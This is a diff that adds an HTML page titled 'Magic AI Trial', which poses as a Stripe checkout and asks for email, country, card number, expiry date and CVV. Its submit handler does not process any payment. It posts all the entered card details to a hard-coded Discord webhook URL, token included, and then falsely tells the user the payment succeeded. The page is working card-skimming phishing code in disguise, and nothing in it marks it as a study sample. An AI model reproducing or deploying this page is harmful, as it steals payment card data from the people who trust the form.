@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Magic AI Trial</title>
+  <style>
+    body {
+      font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f6f9fc;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 50px auto;
+      background-color: #fff;
+      border-radius: 6px;
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+      padding: 40px;
+
+      padding-top: 60px;
+      padding-bottom: 60px;
+      position: relative;
+    }
+
+    input[type="text"],
+    input[type="number"],
+    input[type="email"],
+    input[type="submit"],
+    select {
+      width: 100%;
+      padding: 14px 16px;
+      margin: 8px 0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      box-sizing: border-box;
+      font-size: 16px;
+    }
+
+    input[type="submit"] {
+      background-color: #6772e5;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    input[type="submit"]:hover {
+      background-color: #5469d4;
+    }
+
+    label {
+      font-weight: bold;
+      margin-bottom: 5px;
+      display: block;
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #32325d;
+    }
+
+    .card-info {
+      margin-bottom: 20px;
+    }
+
+    .card-info label {
+      display: inline-block;
+      width: 150px;
+    }
+
+    .card-info input,
+    .card-info select {
+      width: calc(100% - 160px);
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="container">
+    <h2>Stripe Checkout</h2>
+    <form id="paymentForm">
+      <div class="card-info">
+        <label for="email">Email:</label>
+        <input type="email" id="email" name="email" placeholder="john@example.com" required>
+      </div>
+      <div class="card-info">
+        <label for="country">Country:</label>
+        <select id="country" name="country" required>
+          <option value="">Select Country</option>
+          <option value="AT">Austria</option>
+          <option value="BE">Belgium</option>
+          <option value="BG">Bulgaria</option>
+          <option value="HR">Croatia</option>
+          <option value="CY">Cyprus</option>
+          <option value="CZ">Czech Republic</option>
+          <option value="DK">Denmark</option>
+          <option value="EE">Estonia</option>
+          <option value="FI">Finland</option>
+          <option value="FR">France</option>
+          <option value="DE">Germany</option>
+          <option value="GR">Greece</option>
+          <option value="HU">Hungary</option>
+          <option value="IE">Ireland</option>
+          <option value="IT">Italy</option>
+          <option value="LV">Latvia</option>
+          <option value="LT">Lithuania</option>
+          <option value="LU">Luxembourg</option>
+          <option value="MT">Malta</option>
+          <option value="NL">Netherlands</option>
+          <option value="PL">Poland</option>
+          <option value="PT">Portugal</option>
+          <option value="RO">Romania</option>
+          <option value="SK">Slovakia</option>
+          <option value="SI">Slovenia</option>
+          <option value="ES">Spain</option>
+          <option value="SE">Sweden</option>
+        </select>
+      </div>
+      <div class="card-info">
+        <label for="cardNumber">Card number:</label>
+        <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+      </div>
+      <div class="card-info">
+        <label for="expiryDate">Expiration date:</label>
+        <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY" required maxlength="5">
+      </div>
+      <div class="card-info">
+        <label for="cvv">CVV:</label>
+        <input type="text" id="cvv" name="cvv" placeholder="123" required maxlength="3">
+      </div>
+      <input type="submit" value="Process Payment">
+
+    </form>
+  </div>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('#paymentForm').submit(function (e) {
+        e.preventDefault();
+
+
+        var formData = $(this).serializeArray();
+        var data = {};
+        $(formData).each(function (index, obj) {
+          data[obj.name] = obj.value;
+        });
+
+
+        var message = {
+          content: " @everyone ",
+          embeds: [{
+            title: "Payment Details",
+            fields: [
+              {name: "Email", value: data.email},
+              {name: "Country", value: data.country},
+              {name: "Card Number", value: data.cardNumber},
+              {name: "Expiration Date", value: data.expiryDate},
+              {name: "CVV", value: data.cvv}
+            ]
+          }]
+        };
+
+
+        $.ajax({
+          type: 'POST',
+          url: 'https://discord.com/api/webhooks/1213195118056833154/FH5Eh9vRZR-kL4TIXdsILlmgJruausAp5by8XtcKrPFA8_n1tK95rBFfZnnE4u1iTbeF',
+          data: JSON.stringify(message),
+          contentType: 'application/json',
+          success: function (response) {
+            console.log('Message sent to Discord webhook:', response);
+            alert("Payment successful!");
+          },
+          error: function (xhr, status, error) {
+            console.error('Error sending Money :', error);
+            alert("Payment failed. Please try again later.");
+          }
+        });
+      });
+    });
+  </script>
+
+  <script>
+    document.getElementById('expiryDate').addEventListener('input', function (event) {
+      let input = event.target;
+      let value = input.value.replace(/\D/g, '');
+
+      if (value.length > 2) {
+        value = value.slice(0, 2) + '/' + value.slice(2);
+      }
+
+      input.value = value;
+    });
+  </script>
+
+  <script>
+    document.getElementById('cardNumber').addEventListener('input', function (event) {
+      let input = event.target;
+      let value = input.value.replace(/\D/g, ''); // Remove non-numeric characters
+
+      if (value.length > 4) {
+        value = value.match(/.{1,4}/g).join(' '); // Add a space after every 4 numbers
+      }
+
+      input.value = value;
+    });
+  </script>
+
+</body>
+
+</html>w
